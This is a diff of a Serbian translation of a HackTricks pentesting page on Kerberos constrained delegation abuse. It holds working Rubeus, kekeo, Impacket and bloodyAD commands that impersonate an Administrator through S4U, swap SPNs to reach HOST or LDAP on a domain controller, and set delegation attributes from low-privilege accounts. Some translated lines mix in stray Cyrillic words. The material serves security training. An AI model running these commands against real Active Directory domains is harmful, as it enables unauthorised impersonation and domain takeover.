@@ -1,21 +1,21 @@
-# Constrained Delegation
+# Ograničeno delegiranje
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Constrained Delegation
+## Ograničeno delegiranje
 
-Korišćenjem ovoga, Domain admin može **allow** računaru da **impersonate a user or computer** prema bilo kojem **service** na mašini.
+Korišćenjem ovoga Domain admin može **dozvoliti** računaru da **imitira korisnika ili računar** prema bilo kom **servisu** mašine.
 
-- **Service for User to self (_S4U2self_):** Ako **service account** ima vrednost atributa _userAccountControl_ koja sadrži [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), onda može dobiti TGS za sebe (service) u ime bilo kog drugog korisnika.
-- **Service for User to Proxy(_S4U2proxy_):** **Service account** može dobiti TGS u ime bilo kog korisnika ka servisu navedenom u **msDS-AllowedToDelegateTo.** Da bi to uradio, prvo mu treba TGS od tog korisnika ka sebi, ali može koristiti S4U2self da dobije taj TGS pre nego što zatraži drugi.
+- **Service for User to self (_S4U2self_):** Ako **service account** ima vrednost _userAccountControl_ koja u sebi sadrži [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), onda on može dobiti TGS za sebe (servis) u ime bilo kog drugog korisnika.
+- **Service for User to Proxy(_S4U2proxy_):** **Service account** može dobiti TGS u ime bilo kog korisnika za servis naveden u **msDS-AllowedToDelegateTo.** Da bi to uradio, prvo treba TGS od tog korisnika prema sebi, ali može koristiti S4U2self da dobije taj TGS pre nego što zatraži drugi.
 
-**Note**: Ako je korisnik označen kao ‘_Account is sensitive and cannot be delegated_’ u AD, nećete moći da **impersonate** njih.
+**Napomena**: Ako je korisnik označen kao ‘_Account is sensitive and cannot be delegated_’ u AD, **nećete moći da ga imitujete**.
 
-To znači da ako **compromise the hash of the service** možete **impersonate users** i dobiti **access** u njihovo ime ka bilo kojem **service** na navedenim mašinama (mogući **privesc**).
+To znači da ako **kompromitujete hash servisa** možete **imitirati korisnike** i dobiti **pristup** u njihovo ime bilo kom **servisu** na navedenim mašinama (mogući **privesc**).
 
-Štaviše, nećete imati pristup samo servisu koji korisnik može da impersonate, već i bilo kojem servisu, zato što se SPN (ime servisa koje se zahteva) ne proverava (u ticketu taj deo nije enkriptovan/potpisan). Zato, ako imate pristup **CIFS service**, možete takođe imati pristup **HOST service** koristeći flag `/altservice` u Rubeus, na primer. Istu slabost u SPN swapping-u zloupotrebljavaju **Impacket getST -altservice** i drugi alati.
+Pored toga, **nećete imati pristup samo servisu koji korisnik može da imituje, već i bilo kom servisu** zato što SPN (ime servisa koje se traži) nije proveravan (u tiket ovoj deo nije enkriptovan/potpisan). Dakle, ako imate pristup **CIFS service** možete takođe imati pristup **HOST service** koristeći `/altservice` flag u Rubeus na primer. Ista SPN zamena slabost se iskorišćava i pomoću **Impacket getST -altservice** i drugih alata.
 
-Takođe, **LDAP service access on DC** je ono što je potrebno da se iskorišti **DCSync**.
+Takođe, **LDAP service access on DC** je ono što je potrebno da bi se iskoristio **DCSync**.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -29,18 +29,18 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
-### Beleške o Cross-domain constrained delegation (2025+)
+### Cross-domain constrained delegation notes (2025+)
 
-Od **Windows Server 2012/2012 R2** KDC podržava **constrained delegation across domains/forests** putem S4U2Proxy ekstenzija. Moderni buildovi (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SIDs da signaliziraju protocol transition:
+Od **Windows Server 2012/2012 R2** KDC podržava **constrained delegation across domains/forests** putem S4U2Proxy ekstenzija. Moderni buildovi (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SID-a koja signaliziraju protocol transition:
 
 - `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kada se korisnik normalno autentifikovao.
-- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je servis potvrdio identitet putem protocol transition.
+- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je servis potvrdio identitet kroz protocol transition.
 
-Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi across domains, što potvrđuje da je S4U2Proxy korak uspeo.
+Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi preko domena, što potvrđuje da je S4U2Proxy korak uspešno završen.
 
-### Impacket / Linux alatke (altservice & full S4U)
+### Impacket / Linux tooling (altservice & full S4U)
 
-Noviji Impacket (0.11.x+) izlaže isti S4U chain i SPN swapping kao Rubeus:
+Noviji Impacket (0.11.x+) izlaže isti S4U lanac i SPN zamenu kao Rubeus:
 ```bash
 # Get TGT for delegating service (hash/aes)
 getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d
@@ -54,19 +54,19 @@ getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
 export KRB5CCNAME=Administrator.ccache
 smbclient -k //dc.contoso.local/C$ -c 'dir'
 ```
-Ako više voliš prvo falsifikovati korisnički ST (npr. samo offline hash), upari **ticketer.py** sa **getST.py** za **S4U2Proxy**. Pogledaj otvoreni Impacket issue #1713 za aktuelne specifičnosti (KRB_AP_ERR_MODIFIED kada falsifikovani ST ne odgovara SPN ključu).
+Ako više volite prvo falsifikovati korisnički ST (npr. samo offline hash), koristite **ticketer.py** zajedno sa **getST.py** за S4U2Proxy. Pogledajte otvoreni Impacket issue #1713 za aktuelne nepravilnosti (KRB_AP_ERR_MODIFIED kada falsifikovani ST ne odgovara SPN key).
 
-### Automatizacija podešavanja delegacije iz low-priv creds
+### Automatizacija podešavanja delegacije sa low-priv creds
 
-Ako već poseduješ **GenericAll/WriteDACL** nad računarom ili **service account**, možeš udaljeno postaviti potrebne atribute bez **RSAT** koristeći **bloodyAD** (2024+):
+Ako već posedujete **GenericAll/WriteDACL** над računarom ili servisним налогом, можете daljinski podesiti potrebne atribute bez RSAT koristeći **bloodyAD** (2024+):
 ```bash
 # Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
 ```
-Ovo vam omogućava da izgradite constrained delegation path za privesc bez DA privilegija čim možete upisati te atribute.
+Ovo vam omogućava da izgradite putanju za constrained delegation za privesc bez DA privilegija čim možete menjati te atribute.
 
-- Step 1: **Dobijte TGT dozvoljenog servisa**
+- Korak 1: **Nabavite TGT za dozvoljeni servis**
 ```bash:Get TGT
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -86,11 +86,11 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
-> Postoje i **drugi načini da se dođe do TGT ticket** ili **RC4** ili **AES256** bez toga da budete **SYSTEM** na računaru, kao što su **Printer Bug**, **unconstrain delegation**, **NTLM relaying** i **Active Directory Certificate Service abuse**
+> Postoje **drugi načini da se dobije TGT ticket** ili **RC4** ili **AES256** bez toga da budete SYSTEM na računaru, kao što su Printer Bug, unconstrain delegation, NTLM relaying i zloupotreba Active Directory Certificate Service
 >
-> **Samo posedovanje tog TGT ticket (ili hashed) vam omogućava izvođenje ovog napada bez kompromitovanja celog računara.**
+> **Samo posedovanje tog TGT ticket-a (ili hashed) vam omogućava izvođenje ovog napada bez kompromitovanja celog računara.**
 
-- Korak 2: **Dobijte TGS za servis koji se predstavlja kao korisnik**
+- Step2: **Dobij TGS za servis lažno predstavljajući korisnika**
 ```bash:Using Rubeus
 # Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
